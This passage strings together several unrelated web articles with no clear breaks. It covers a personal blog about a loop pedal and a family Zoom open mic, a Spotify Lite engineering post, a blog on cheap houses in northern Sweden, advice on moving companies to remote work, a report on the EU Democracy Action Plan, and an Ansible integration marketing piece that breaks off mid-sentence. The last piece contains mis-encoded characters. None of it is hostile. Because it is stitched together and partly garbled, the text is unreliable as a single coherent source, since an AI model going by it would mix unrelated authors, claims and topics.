<div data-language="text"><pre><code>X X X X X X X X
  y   y     y y
z z z z z z z z</code></pre></div>
<p>Now, this pattern will keep repeating over and over, expanding to the right.</p>
<div data-language="text"><pre><code>X X X X X X X X X X X X X X X X --&gt;
  y   y     y y   y   y     y y --&gt;
z z z z z z z z z z z z z z z z --&gt;</code></pre></div>
<p>What happens if you are recording a layer that extends longer than the root layer? Good question. The recording simple wraps around to the beginning of the root layer and you can keep going. However you will notice that you are already hearing what you recorded for this layer, so that can sound strange. Let's show an example.</p>
<p>I'm going to add a layer that just plays ascending notes up the guitar neck (a really crappy solo) and have this layer wrap around.</p>
<div data-language="text"><pre><code>X X X X X X X X
  y   y     y y
z z z z z z z z
1 2 3 4 5 6 7 8</code></pre></div>
<p>So far, so good. Why not keep going...</p>
<div data-language="text"><pre><code>X X X X X X X X
  y   y     y y
z z z z z z z z
1 2 3 4 5 6 7 8
9 10</code></pre></div>
<p>As you can see, my latest layer wrapped around to the beginning, such that when I played the <code>9</code>, you would hear the <code>1</code> at the same time. This may or may not be what you want to do. I'm guessing.. no. Especially if you're playing some epic Type II guitar solo.</p>
<p>Thus, one of the more common use cases of the loop pedal is to lay down some repeatable groove that you can sing various verses or solo over. Instead of making the "unique" or "changable" a layer in your loop stack, you just keep that off to the side.</p>
<p>Reader beware that my loop pedal is relatively simple. There are other, better, more-intense loop pedals where you can have multiple different loop stacks going at the same time. For example, maybe you've got a loop going for the verses and another separate loop stack for the choruses in your song.</p>
<p>But I appreciate the simplicity of my pedal. The one thing I still haven't figured out is whether or not you can do the <code>pop</code> stack operation on it. The <a href="https://www.boss.info/us/products/rc-1/">documentation</a> suggests that you can erase the top layer of the stack, but I haven't figured it out yet. For now, I've been living in a <code>push</code> only world, flubs included, which you'll hear in the next section.</p>
<h3>School Supplies</h3>
<p>Hello, world, this is your premiere of SCHOOL SUPPLIES, the third single off my forthcoming EP: "Greetings From Buttzville, NJ":</p>

<p>The chords, for those interested (looking at you, The Grones) are:</p>
<div data-language="text"><pre><code>Verse
G Bm Em C

Chorus
D G C

Outro(key change!)
A C#m F#m D</code></pre></div>
<p>That's right! I pulled off my first key change. Thank you, Taylor Swift "Love Song" for the daily inspiration.</p>

<h4>Uncle Mike's Tips for Running a Zoom-Based Open Mic Night</h4>
<p>Big thanks to Uncle Mike for organizing our second Zoom family open mic night. He runs a tight ship, mostly trying to prevent me from launching into a <a href="https://www.charlieharrington.com/bullet-train-to-merlins-grave">Bullet Train to Merlin's Grave medley like at Popestock</a>.</p>
<p>To paraphrase his tips:</p>
<ul>
<li>Each performer gets one song, of "normal song length" (so that means no Tubular Bells)</li>
<li>Announce the order in advance</li>
<li>Tune up your instrument when you're on deck or in the hole</li>
<li>Don't worry about messing up, start over if you need to, this is fun. Music is the best!</li>
<li>Change your zoom settings to "Original Sound"</li>
</ul>
<p>This last one is key. Zoom does some "stuff" to make things sound "good" during boring work meetings that are boring. It's not optimized for fun singalongs that are fun. So, it's pretty much essential to <a href="https://support.zoom.us/hc/en-us/articles/115003279466-Enabling-option-to-preserve-original-sound">follow these steps</a> when you're singing and strumming over Zoom, unless you're trying to incorporate cosmic waves of hollow nothingness into your jam. Maybe you are?</p>
<p>Oh, you should check out Uncle Mike's music podcast, <a href="https://www.tellyouwhatpodcast.com/">Tell You What! The Podcast</a>. He interviews young musicians and bands on the run and it's fun and great and keeps you on your toes with new upcoming artists.</p>
<p>As Uncle Mike says, music is the best!</p></div></div>]]>

<p>What if, for some users, the very best Spotify is a little less Spotify? Spotify Lite started as an experiment that had to be proven, both from a technical and a product-market fit perspective. In 2017, we found that a significant portion of registrations in some of our fastest-growing markets were happening on Android devices much older than what we were used to seeing in North American and European markets. Because of storage constraints, many of our potential users couldn’t install Spotify, and the ones that could weren’t getting the full “Spotify experience”.</p>



<p>Our mission was clear: we needed to make Spotify accessible to users with constrained resources, i.e., unreliable networks or phones with limited storage, memory, and low-resolution screens. Now we needed a team.</p>



<h2>A flexible, Lite team</h2>



<p>The main Spotify Music Android client is divided into multiple features, all owned by separate teams. But for Spotify Lite, we formed a single, autonomous team to fully own the entire process of designing, developing, and releasing the app. This allowed us to roll out an MVP product in record time.</p>



<p>Before building the new app, the Spotify Lite team — a cross-functional mix of insights, design, product, and engineering — travelled to a number of locations where Lite would be available in order to experience the network and device constraints firsthand. It was absolutely critical to design Spotify Lite with our users in mind, and to experiment and iterate on the streaming experience for cases when devices have poor connectivity or are completely offline. Only then were we able to come up with an optimal, performant solution.</p>



<p>It should be noted that we wouldn’t have achieved success had it not been for the existing tooling that we were able to reuse — tools for enabling recommendations, playback, search, browsing, and instrumentation. We were building on all the work, experience, and knowledge that came before us, giving us the ability to focus on finding solutions for our users.</p>



<h2>Spotify Lite: Spotify’s first separate app</h2>



<p>Creating a more performant and smaller version of the Spotify app proved to be more challenging than we liked, as the codebase hadn’t been modularized. With these challenges in mind, we decided to build a new separate app from scratch, giving us the ability to quickly iterate, obtain feedback, and innovate freely.</p>



<p>Spotify Lite was initially built on an entirely different playback stack than the regular Android app. This allowed Lite to be as small as possible, with minimal memory and network data usage. Having a separate app enabled us to test new performance ideas and to gain insights, such as understanding how application size impacts the new user funnel. We no longer use the initial playback stack, and have evolved towards a tailored setup that guarantees stability and playback quality on unreliable networks.</p>



<p>Building Lite was a lot like packing a backpack for your travels. With limited space, you have to be selective in what you bring. Only the most crucial and necessary components were carried forward.</p>



<h2>A balancing act</h2>



<p>Shrinking the original Spotify app to create Spotify Lite brought up two crucial questions: What key elements of the original Spotify should remain intact to ensure listeners still get the “Spotify experience”? And what sacrifices do we need to make to ensure Spotify Lite does, in fact, remain light?&nbsp;</p>



<p>In answering the first question, we knew that keeping the brand look and feel was absolutely critical to giving listeners a Spotify they could recognize. So, we used the same design philosophy as the original Spotify Android app. However, given a range of constraints (smaller screens, quick/performant interactions), we had to adapt some of our design choices. For example, information density has to be reviewed with smaller screen sizes and lower resolutions in mind, as well as whether information is still readable on a broken or scratched screen (these phones have been around for a while!). We’ve recently added our heuristics for how to design for these constraints to the overall design strategy so that this is kept in mind for other apps and surfaces, as well.</p>

<p>Along with streamlining the design, we also had to shrink things down under the hood. The team put a lot of work into implementing all the known techniques for binary size reduction, as well as making tradeoffs when selecting features. As the app includes a native shared library for playback, we have experimented with many compiler and linker flags to prioritize a small app size. This includes, for instance, switching to the <em>lld</em> linker, employing link time code optimizations, and disabling certain language features like RTTI.&nbsp;</p>



<p>On the Android side, it was the use of App Bundles for application publishing, optimizing our R8 shrinking, carefully choosing dependency libraries, and stripping unused translations. We made an effort to reduce the install size, too. We store the shared library unpacked in the APK without copying it to the install folder, and allow users to store both the app and its cache and downloads separately on the SD card.</p>



<p>After the initial larger gains, it became harder and harder to reduce the app size. It was a constant balance between keeping it small while adding additional requested features. Along with monitoring the app download and install sizes in the Google Play Store, we added checks to our continuous delivery pipelines to prevent size bloat.</p>



<h2>Lite is different</h2>



<p>Because Lite was a brand-new concept, some of our work went beyond the app itself, leading to improvements to Spotify systems that other teams could benefit from, too.</p>



<p>Before Lite, developers could safely assume there was only one Spotify app for any given platform — the Android platform and the Android app were considered one and the same. Backend services — including those providing application views and deciding which features are enabled — were built with that assumption in mind. Some of these assumptions cascaded through many different parts of our internal systems.&nbsp;</p>



<p>When we added Lite to the mix, developers needed to know exactly which app a user was using, not just what platform they were on. We generalized that issue beyond our own app and built ways to identify all the apps in the Spotify ecosystem. That work paid off again each time anyone introduced a new Spotify app to the Android platform, including our sister apps <a rel="noreferrer noopener" href="https://www.spotify.com/us/kids/?utm_source=us-en_brand_contextual_text&amp;utm_medium=paidsearch&amp;utm_campaign=alwayson_ucanz_us_premiumbusiness_kids_brand+contextual-desktop+text+exact+us-en+google&amp;gclid=CjwKCAiA8Jf-BRB-EiwAWDtEGnamKsxw1Yx_w3KgzFDyJ1g4NKVvIUkc9jRA8fBFdlHCkR8pD4iHmBoCMLAQAvD_BwE&amp;gclsrc=aw.ds" target="_blank">Spotify Kids</a>, <a rel="noreferrer noopener" href="https://www.spotify.com/us/stations/" target="_blank">Spotify Stations</a>, and <a href="https://spotify-everywhere.com/collections/car-audio/products/polestar" target="_blank" rel="noreferrer noopener">Android Automotive</a>.</p>



<p>We also had to redesign parts of Spotify’s playback library with Lite constraints in mind — taking into account smaller download and installation sizes, memory usage, and the reduced feature set. Similar considerations have been applied to Spotify’s music and image transcoding services.</p>



<h2>Making Lite a big deal</h2>



<p>Our ambition is to be the best-in-class Lite app. We are constantly modifying and updating the app to adapt to our users and their ever-evolving needs. As we’ve seen positive adoption of Spotify Lite since launch, we’ve invested in performance improvements, quality, and resilience. We recently rolled out an overhaul of our client architecture to cater to our growing user base and to reduce playback latencies.</p>



<p>The birth of Spotify Lite has given us flexible solutions that our other apps have benefited from. One such example is our backend service that scales down images to use less network traffic. Another is the support for App Bundles, which has allowed us to reduce the app size significantly so that users only download the assets needed for their particular device. Creating a separate app was a first for our build system — one that laid the groundwork for building native dependencies, sharing code components, and setting up crash and ANR reporting for tracking app quality.</p>



<p>We are continuing our work to lower the barrier for people to access Spotify. We have our backlog full of ideas and performance improvements we want to keep investing in, not only for Lite but also for our other apps to benefit from.</p>

                    <p>The mysterious YouTube algorithm had me stumble upon an unlikely phenomenon. It seems like people from all over the world are migrating to the North of Sweden. Why? Is this the start of a trend?</p>

<p>When I was about 15 years old I did a 3-day internship at a renowned web agency in Stockholm. Quite a long trip. Because that’s about 900 km away from my hometown Piteå located in the great North where I’m born and raised.</p>

<p>My first day was spent in a joint-project meeting with a TV advertising agency. That was a wild experience. The dress code seemed to be scarf + blazer, indoors (wtf?). <a href="https://reklamaremedhalsdukinomhus-blog.tumblr.com/" target="_blank">Apparently very typical for the ad industry in Sweden</a>. Another guy was extremely laid back with his shoes on the conference table, constantly doing pen-tricks. I later realized that this was my first “creative brainstorming meeting”.</p>

<p><img alt="Reklamare med halsduk inomhus" src="https://danielmarklund.com/assets/img/blog/reklamare-med-halsduk.jpg"> <img alt="Pen spinning" src="https://danielmarklund.com/assets/img/blog/pen-spinning.gif"></p>

<p>The project was divided into two parts, they did the TV ads and we would build some cool online social platform that went along with it. Probably in Flash, as usual back then. The client was a big Swedish food brand who wanted to find good use for the many sports stars they had signed.</p>

<p>One guy said (Yes. They were all men): “What if we create like a big fictive house where all the sports stars live together? Then you create a platform where the kids can log on and like, play games, read up about the sports stars, chat and do some trivia.”</p>

<p>Yes. This was around the year 2000, long before Facebook. Social platforms were very popular among kids already.</p>

<p>Another guy responded enthusiastically: “That’s a great idea. We can buy a disposable house up in the North. Then we shoot the TV ads there and you guys can use the exterior photos to make some cool-fantasy-interactive-house website. We can probably find a house for less than 150k that we abandon once it’s done. It’s dirt cheap up there.” (150k SEK is about $18k)</p>

<p>Me in my young mind: “Wait… what? 150k is a lot of money! Disposable house?”</p>

<p>After the meeting, my mentor said: “Yes, it’s a lot of money. For you. Considering they pay the same amount for every 15-second slot on prime time TV, it’s not that much money to them.”</p>

<p>That certainly brought new perspectives to the value of wearing scarves indoors. And to the value of money.</p>

<p>I never thought I would hear someone refer to a house in my home region as “disposable” again. But I was wrong…</p>

<h2 id="quick-history-lesson-very-simplified">Quick history lesson (very simplified)</h2>

<p>Back in the 16th century, when other countries successfully conquered land all over the world through colonization, Sweden realized that we could find similar resources in our own backyard.</p>

<p>Up until that point, nobody really paid much attention to the area called the Northlands (sv. Norrland) which makes up about 59% of the country (FIFTY-NINE PERCENT). It was even more sparsely populated back then. You would only find a lot of forest, some poor farmers, and Sámi people with their reindeers (natives).</p>

<p><img src="https://danielmarklund.com/assets/img/blog/norrland.jpg" alt="Norrland of Sweden"></p>

<p>Slowly Sweden started to colonize the North, following the coastline. But it wasn’t until late 1800 things really started to take off. First, an extensive sawmill industry was established. Utilizing the rivers as efficient transportation for driving logs down to mills at the coasts. Then some serious mining up in the mountains which established the need for better communications. Railroads ftw! Followed by the exploitation of hydropower in our numerous and powerful rivers (no pun intended).</p>

<p>To give you an idea of the success, here is the population growth in a neighboring city of mine:</p>

<p><img src="https://danielmarklund.com/assets/img/blog/pupulation-growth-lulea.jpg" alt="Growth in population, Luleå"></p>

<p>All cities along the coast followed the same exponential trend. Sweden experienced unprecedented growth because of this rapid industrialization.</p>

<p>Everybody was working hard for the benefit of a selected few. Unfortunately the Average Svenne was held back by old structures. As a result the wealth gap only increased as time passed. The situation was calling for a change.</p>

<p>Therefore in 1920, a successful political campaign was launched with the vision to create a more equal Sweden. Replacing a class society with a welfare state (sv. Folkhemmet). The recipe included workdays limited to 8 hours, paid vacation, pension, free healthcare, free dental care, free school, housing, and grants for having children.</p>

<p>The extension of this campaign is what made Sweden to one of the best and most equal countries in the world. <a href="https://index.goodcountry.org/" target="_blank">Their words</a>, not mine.</p>

<p>No matter where you lived in the country, you had the same rights. Construction of schools, libraries, health care, and supermarkets took place in the most remote places. Communities were established in unlikely places. The land was abundant. The resources as well. Do you want a house? Everybody gets a house!</p>

<p>Sweden was thriving, including the “small” colony in the North.</p>

<h2 id="the-situation-today">The situation today</h2>

<p>The same rights exists today and in financial terms Sweden is doing better than ever. But how is the countryside doing? Not so well.</p>

<p>Remote villages are on the decline as a result of urbanization. The jobs are moving closer to the cities along with the people. Schools, libraries, day cares, and supermarkets are closing down. It’s not as convenient to live in sparsely populated areas anymore. The North is no exception.</p>

<p>Result: The people are leaving, but the houses remain. That’s why you can find dirt cheap houses in the North of Sweden. Well. In some places at least.</p>

<p>Northern Sweden is extremely beautiful. It can be cold and harsh during the winter months, but the people here are skilled, tough, helpful, and welcoming.</p>

<p>The region is a hidden gem, often referred to the last remaining wilderness in Europe. Lush green and hot in the summers, where the sun never goes down.  Snow and northern lights in the winter. Let’s not forget the beautiful seasons in between.</p>

<p>Even people from abroad have started to take notice…</p>

<h2 id="cue-the-youtube-generation">Cue: the YouTube generation</h2>

<p>What do you get if you take the freedom of working from anywhere, throw in some existential crisis induced by “self-help gurus” / “life coaches”, combine this with tranquilizing nature and cheap ass housing?</p>

<p>You get: (Wait for it…)</p>

<p><mark><strong>YouTubers buying houses and moving to the North of Sweden!</strong></mark></p>

<blockquote>
  <p>“Renting in London for a year would be the same price (or more) as buying a property in Sweden. We basically bought a <strong>disposable house</strong>.”<br><small><em>Naomi &amp; Jack. Bought a house, forest and land for ~100k SEK ($12k USD)</em></small></p>
</blockquote>

<p>“Disposable house”, eh? There it was again.</p>

<h2 id="the-list">The list</h2>

<p>Believe me when I say: I’m extremely grateful for these people. They are giving more exposure to this region than any tourist agency could ever hope for. So from the bottom of our hearts: Thank you!</p>

<p>I’ll try to keep this list updated, so make sure to send me any tips. Get inspired. Move to Sweden! Make more people move north. Catch you on the flip side.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As I prepare for my talk at <a href="https://www.digitalwarriors.tech/speakerwall/">Digital Warriors 2020</a>, entitled "from office to remote in 48h", I want to share some thoughts about the process of moving a company from office to remote-first and then to remote-only. This post represents what I've learned over the past eight years working at the best remote companies on the planet.</p>
<p>It's important to clarify that there are different stages of adoption of remote work. As a company moves towards remote only, they will go through these, and knowing the advantages is essential. It is also necessary to understand the risks.</p>
<p><img src="https://imgur.com/0BQj4dc.png" alt="On-prem vs. remote-first vs. remote only"></p>
<p>Initially, a company is mostly, if not wholly, on-premise. The fundamental dynamics at work are that there is no trust that people will perform at the required level unless they are present in person and supervised. On the other hand, people working in these dynamics will optimize to succeed in them. So they will make sure they are visible in the office, always appear busy, and do their best to be either diligent supervisors or competent executors. Of course, not all companies have these kinds of issues. This kind of company perhaps reserves the term "work at home" to describe days where people can work without coming to the office. Working from a holiday destination is unthinkable unless people are doing so during the holidays.</p>
<p>The next stage of going remote is remote-first. The idea is that the company can still be partially on-premise, but the processes change to accommodate remote workers, i.e., people who work remotely all year long. This stage has been accurately described by my old friend and <a href="https://twitter.com/df07/status/504677877544390656/photo/1">OK-est boss</a> <a href="https://twitter.com/df07">David Fullerton</a> in his excellent post "<a href="https://stackoverflow.blog/2013/02/01/why-we-still-believe-in-working-remotely/">Why We (Still) Believe in Working Remotely</a>":</p>
<blockquote>
<p>There's no halfsies in a distributed team. If even one person on the team is remote, every single person has to start communicating online. </p>
</blockquote>
<p>While this point is accurate, it is not all that is needed to move from on-premise to remote first. What is required is that all the <em>tools</em> become remote. Today, it is much easier to accomplish this feat than a few years back (for example, many teams use GitHub as source control, and GitHub is already a remote tool. If a team has on-premise git, then access needs to be granted through a VPN. As many people are remote, but not all, there's a risk of having the company split culturally between remote and on-premise. Regular retreats or in-office rotations are necessary to keep the bonds straight. For example, we had one yearly remote and non-remote retreat at Stack Overflow. Still, other London-area remotes and I also went to the London office regularly, and this paid off handsomely in making everyone feel part of the same company.</p>
<p>The final stage is having fully distributed companies. While this seems like a no-brainer from remote first, it's another involved step. This step is tricky is because remote-first companies have the luxury of choosing which parts of the job will happen on-premise and which other areas can be remote. This possibility allows them to move to remote the "easier" 80% of the jobs and keep on-premise the part that is not easy to change. Logistics, such as sending off Christmas presents, is not easy if people are working remotely. Retreats become necessary to be able to know your teammates personally.</p>
<p>All in all, there's a clear path to move any company from the office to telework:</p>
<ol>
<li>You need to trust your people and know that it is possible to have people working without being in the office.</li>
<li>Migrate the tools and affect your office's culture, so everyone works with remote-friendly applications and devices, even in the office.</li>
<li>Migrate people from the office to their remote locations while fixing and improving the tools and processes that need change to take these steps. </li>
</ol>

<p>The European Commission <a href="https://ec.europa.eu/commission/presscorner/detail/en/ip_20_2250" target="_blank">announced</a> a series of proposals Thursday aimed at combating online disinformation, boosting the region’s media sector and protecting upcoming elections from outside interference.</p>



<p>The initiatives, dubbed the <a href="https://ec.europa.eu/transparency/regdoc/rep/1/2020/EN/COM-2020-790-F1-EN-MAIN-PART-1.PDF" target="_blank">European Democracy Action Plan (EDAP)</a> and <a href="https://ec.europa.eu/digital-single-market/en/news/europes-media-digital-decade-action-plan-support-recovery-and-transformation" target="_blank">Media and Audiovisual Action Plan (MAAP)</a> respectively, come roughly two weeks before Brussels <a href="https://www.politico.eu/tag/digital-services-act/">is expected to publish</a> a separate set of legislative proposals that will target the dominance of a few, mostly American, tech companies and place greater responsibilities on social media companies about what is posted on their networks.</p>



<p>The precursor announcements Thursday are aimed at tackling some of the problems straining democratic institutions across the Continent — from how online falsehoods circulate around elections to the need to support the media sector which has been hard hit by the COVID-19 pandemic.</p>



<p>“Democracy cannot be taken for granted; it needs to be nurtured and protected,” Věra Jourová, the Commission vice president who oversaw the proposals, said in a statement. "Our plan aims at protecting and promoting meaningful participation of citizens, empowering them to make their choices in the public space freely, without manipulation."</p>



<p>Despite the rhetoric, no actual legislation was published Thursday. </p>



<p>Instead, it is a statement of political intent from European Union officials that greater safeguards need to be put in place, both to counter online disinformation and protect the bloc's media and audiovisual sector. Specific rules, including forcing the likes of Facebook, Google and Twitter to be more accountable over how falsehoods are shared on their networks, will be announced next year.</p>



<p>The EDAP centers on <a href="https://www.politico.eu/article/brussels-targets-online-political-advertising/">placing limits</a> on how political ads on social media can be targeted at would-be voters, outlining a new code of conduct for platforms around disinformation and highlighting how such measures will work with the upcoming EU Digital Services Act — proposals aimed at placing greater responsibilities on these platforms that will be published December 15.</p>



<p>The MAAP focuses on the news media sector and audiovisual entertainment, including video games and virtual reality. Because of the pandemic, news publishers lost 30-80 percent of advertising revenues and TV channels 20 percent in this year’s second quarter, the document reads. Movie theaters have also suffered massive losses.</p>



<p>“We are committed to help the media sector weather the current storm and challenges brought by the crisis, and to take full advantage of the opportunities offered by the digital transformation in both the short-term and long-term," Margrethe Vestager, the Commission's vice president in charge of digital strategy, said in a statement.</p>



<p>POLITICO broke down the important parts of the announcement. Here's what you need to know.</p>



<h3>1. Links to Digital Services Act</h3>



<p>The EDAP is expected to work hand-in-hand with the upcoming Digital Services Act. That initiative, according to Thursday’s announcement, will include transparency rules that companies such as Facebook and Google must follow over how their algorithms promote potentially dangerous content. It will also create a so-called “co-regulatory backstop” that will involve companies, regulators and civil society groups working together to police the new system.</p>



<p>As part of that process, the DSA will mandate that large platforms assess the risks that illegal content may have on their users and take appropriate, unnamed, steps to address those concerns, including how the companies are curbing the spread of disinformation online. Potential sanctions, including financial penalties, could be levied if companies do not comply. More details will come on December 15.</p>



<h3>2. New rules on disinformation</h3>



<p>To help address the new requirements outlined in the DSA, the Commission wants to revise its code of conduct on disinformation, a voluntary set of transparency rules that all the major social networks have already signed up to. That will include creating specific metrics for combating online falsehoods that will be overseen by regulators, developing rules to stop the amplification of disinformation across the platforms and providing greater data access to outside groups who will monitor how the companies are complying with the obligations.</p>



<p>The revised code of conduct will be the carrot to offset the potential regulatory sticks in the DSA. If companies sign up to the new code of practice, which will still be voluntary, they can use their participation as a means to offset the new obligations for platforms over assessing the potential risks of harmful content spreading on their networks. If they don’t, Facebook, Google, Twitter and others may open themselves up to greater regulatory scrutiny that will be unveiled in the DSA.</p>



<h3>3. Crackdown on online campaigning</h3>



<p>The Commission has political ads that run on social media in its sights. Next year, officials will propose new legislation aimed at boosting transparency over how such partisan paid-for messages circulate online. That includes plans to limit so-called microtargeting, or the use of sophisticated data profiles of would-be voters to target them with tailored messages, though an outright ban is not expected.&nbsp;</p>



<p>The goal is to have a new regulatory system in place by the European Parliament elections in 2024, and will include categories of political actors who would fall into these new transparency mechanisms. It is still not defined what would constitute a political ad — something that has become a hotly debated topic as political groups try to dodge efforts to police their online activities.</p>



<h3>4. Protecting elections</h3>



<p>EU officials want to promote greater cooperation between countries on how to keep domestic elections safe. The Commission already oversees a group of national experts who share best practices. That will be extended to include measures to protect election infrastructure and cybersecurity expertise, and will involve war-gaming exercises to test the resilience of local elections to potential outside threats.</p>



<p>Brussels similarly is keen to promote the potential of online voting, something already part of the Commission’s mandate. It will also outline proposals next year to add online hate crime and hate speech to a list of crimes that fall within the EU’s legal mandate.</p>



<h3>5. Media pluralism</h3>



<p>Jourová, who’s also in charge of rule of law, said the new proposals would "increase protection of journalists and fight disinformation and interference, while fully protecting freedom of speech."&nbsp;</p>



<p>The Commission will set up a Media Ownership Monitor to increase the transparency of media ownership and develop measures for the “fair allocation of state advertising.” Brussels will also analyse national media diversity and concentration rules to assess how to ensure pluralism online, “especially in the light of the growing role of online platforms.” </p>



<h3>6. Easier access to EU and private money&nbsp;</h3>



<p>In the MAAP, the Commission wants to ensure the audiovisual and news media sector can access EU money. In the first quarter of next year, EU media companies will have access to a new interactive tool to guide them through the various support instruments, including Creative Europe that has a sub-program dedicated to media.&nbsp;</p>



<p>The Commission also seeks to alleviate “a gap in equity financing for audiovisual,” which is estimated to be between roughly €400 million and €650 million<strong> </strong>per year. The EU’s executive body will set up a dedicated investment platform for EU audiovisual production and distribution companies, backed by funds coming from Creative Europe MEDIA and InvestEU, to attract private investment. The goal is to generate investments of €400 million in the next seven years.&nbsp;</p>



<p>European news media companies will get easier access to loans via the backing of the InvestEU guarantee. The Commission will establish a European News Media Forum to engage with media regulatory authorities, journalists, press councils, civil society and international organizations.&nbsp;</p>



<h3>7. Green and cross-border sticks&nbsp;</h3>



<p>The MAAP includes a lot of carrots for the audiovisual sector, but also a few sticks.&nbsp;</p>



<p>Earlier this week, the Commission said it <a href="https://www.politico.eu/?p=1533361">would not extend</a> the scope of the so-called <a href="https://oeil.secure.europarl.europa.eu/oeil/popups/ficheprocedure.do?reference=2016/0152(COD)&amp;l=en" target="_blank">geo-blocking regulation</a> to copyright-protected material, such as movies and TV shows. Brussels, though, wants to launch a dialogue with the audiovisual industry in the first half of next year to “agree on concrete steps to improve the access to and availability of audiovisual content across borders in the EU.” If progress is not sufficient, “legislative intervention” is on the table.&nbsp;</p>



<p>The audiovisual sector is also expected to become greener in the coming years. In the first half of 2021, the Commission will set up a forum with the industry — including online streaming platforms — and audiovisual funds to discuss best practices and green standards to make the media sector more sustainable. The EU’s executive body will also work on best practices on green production and green provision of services.</p>

                    <p>Integration is a crucial aspect of any modern business. As businesses in every
industry are managing increasingly more complex systems, a shift towards
unified automation and DevOps principles is essential to stay competitive.</p>
<p>With software integration, it’s easy to connect disparate systems and
applications, enabling your users to bring different products and departments
together, making their business processes more efficient and less painful.</p>
<p>Read on as we explore software integration, reveal the benefits of building
integrations for your product, and discuss the best practices you can follow.</p>
<h2 id="what-is-software-integration">What is software integration?</h2>
<p>Integration in software engineering is the combination of various software
subsystems into a single, unified architecture. This process of creating
integrated systems facilitates greater functionality and performance across
all the separate components.</p>
<p><a href="https://chiefmartec.com/2020/05/proof-platform-saas-apps-median-15-integrations/" title="Pandium SaaS study">A recent study by Pandium</a> on the 1,000 fastest-growing SaaS
(software-as-a-service) companies found that these companies have a median of
15 integrations. App platforms like Zapier typically have over 500
integrations. Configuration management tools like <a href="https://puppet.com/" title="Puppet's home page">Puppet</a>, <a href="https://www.chef.io/" title="Chef's home page">Chef</a> and
<a href="https://www.ansible.com/" title="Ansible's home page">Ansible</a> have hundreds of integrations. Ansible, for example, even has more
than 4.000 such integrations (Ansible modules).</p>
<h2 id="integration-types">Integration Types</h2>
<p>There are four key types of software integration, each of which serves a
distinct purpose:</p>
<h3 id="1-system-integration-and-automation">1. System integration and automation</h3>
<p>System integration is a core element of software integration, which enables an
application to communicate with all the existing services and applications
within a companyâ€™s IT ecosystem.</p>
<p>For example, Ansible integration for AWS cloud services enables seamless
connectivity with a userâ€™s AWS cloud. By using the AWS Ansible Collection, AWS
users can efficiently manage Amazon resources, build a secure VPC, and deploy
documents, which improves their user experience with AWS Cloud.</p>
<h3 id="2-api">2. API</h3>
<p>An Application Programming Interface (API) is an interface that allows
separate systems to communicate.  The usersâ€”like third-party app developers
and business partnersâ€”donâ€™t need to know how the software works on the
back-end, as they simply use the API to leverage the appâ€™s functionalities.</p>
<p>You can think of an API like a waiter at a restaurant. Users can view the
available options on the menu and order what they like. They don’t see what
happens in the kitchenâ€”they just place an order and receive the finished meal.</p>
<p>In this way, an API serves as a bridge between applications that use
integration to transmit data seamlessly, without any complexity. A good
example is the payment processing platform, Stripe. Another example is Ansible
Tower offering API-based integration for external systems like CI/CD.</p>
<h3 id="3-webhooks">3. Webhooks</h3>
<p>Webhooks are user-defined HTTP callbacks that are triggered by specific events
to link applications together.</p>
<p>When the trigger event occurs in the source website, the webhook recognizes
the event, collects data, and sends it to the specified URL as an HTTP
request. It’s possible to set up a webhook event on one website to trigger
actions on another website.</p>
<p>This type of integration provides access to real-time data at any time. Also,
as the process updates information whenever events occur, businesses can
automate data collection.</p>
<h3 id="4-isc">4. ISC</h3>
<p>Integration Services Components (ISC) live on a webserver to simplify
connections with local management tools. These components are not code-based,
and so, the business only needs cloud access to integrate ISC.</p>
<p>An ISC allows users to access data directories and on-premise software tools
for business intelligence and asset management without the need to import
large files. In many ways, it is an out-of-the-box solution. However, you must
be familiar with the local database to set up an ISC integration.</p>
<h2 id="why-should-you-build-integrations-for-your-product">Why should you build integrations for your product?</h2>
<p>The most prominent benefit is to simplify complex business processes by
unifying them with system integrations. However, itâ€™s far from being the only
one. Read on to discover 6 benefits for building product integrations:</p>
<h3 id="ease-the-complexity-of-users-systems">Ease the complexity of userâ€™s systems</h3>
<p>Nowadays it is not enough to build the best in breed products. Customers are
seeking ways to integrate your products efficiently into their workflows. It
is not uncommon to find solutions from multiple vendors for a single area of
operations. Having to learn how to manage each one requires time and money. By
offering integrations, however, you are enabling your customers to unify all
the technologies seamlessly.</p>
<h3 id="speed-up-the-adoption-of-your-product">Speed up the adoption of your product</h3>
<p>Introducing new products into an existing environment always poses barriers,
even when you have a far superior product. This is mainly rooted in the fact
that people do not like the change.</p>
<p>Using integrations with industry adopted tools like Ansible or Puppet
simplifies the onboarding of your products into organizations already using
such tools. Integrating them into their workflows will cause less friction as
their Ops teams will already be familiar with the core platform unifying
access across the whole ecosystem.</p>
<h3 id="faster-growth-of-your-user-base">Faster growth of your user base</h3>
<p>Onboarding a new solution is only the first step of a company-wide adoption
process. One of the key requirements is the ease of adding new users and thus
leveraging the new solution to its full potential.</p>
<p>Letâ€™s take a look at the example of <a href="https://steampunk.si/blog/ansible-integration-helps-sensu-reach-more-users/" title="Sensu and Ansible integration benefits">Sensu</a>. Their solution is an
Observability Pipeline that delivers Monitoring-as-Code for any cloud
infrastructure. Before integrating with Ansible, they were facing two
challenges - a drop off during the onboarding process and a sub-optimal user
base within already onboarded businesses.</p>
<p>With the Sensu Ansible Content Collection in place, Sensu customers can now
get better business results by expanding its usage and adding additional users
with ease.</p>
<h3 id="improve-the-customer-experience">Improve the customer experience</h3>
<p>Improving your solutionâ€™s customer experience is a mix of different changes,
but one thing stays constant - familiarity.</p>
<p>If businesses can work with already widely adopted configuration management
tools (such as Ansible) for onboarding and using your product, thereâ€™s a good
chance that the familiarity will simplify its early stages of use, improving
the first impression and the overall experience.</p>
<p>The real impact of familiarity results in saved time by leveraging already
existing know-how and not investing resources into learning new tech or
processes.</p>
<p>This brings us back to the <a href="https://steampunk.si/blog/ansible-integration-helps-sensu-reach-more-users/" title="Sensu and Ansible integration benefits">Sensu</a> example - they managed to significantly
improve their product experience by offering an Ansible Content Collection.
Hereâ€™s a quote from their client:</p>
<p>“I tried your product a couple of months ago” but they didnâ€™t finish setting
it up for one reason or another, “But then I saw that there was an Ansible
Collection for it, so I tried again and I got it set up and started using it
right away across thousands of devices.”</p>
<h3 id="grow-your-business-with-integrations">Grow your business with integrations</h3>
<p>All of the above lead to growing your business faster and more efficiently
through such integrations. Think of an integration as an additional sales
channel. Your product appears in the marketplace of the product you are
integrating it with.</p>
<p>For example, Ansible Content Collections are available on <a href="https://galaxy.ansible.com/" title="Ansible Galaxy">Ansible
Galaxy</a>. However, those are community-generated Collections that can
be downloaded at no cost. If youâ€™d really like to attract new customers with a
high-quality, supported, enterprise-grade integration, certifying your
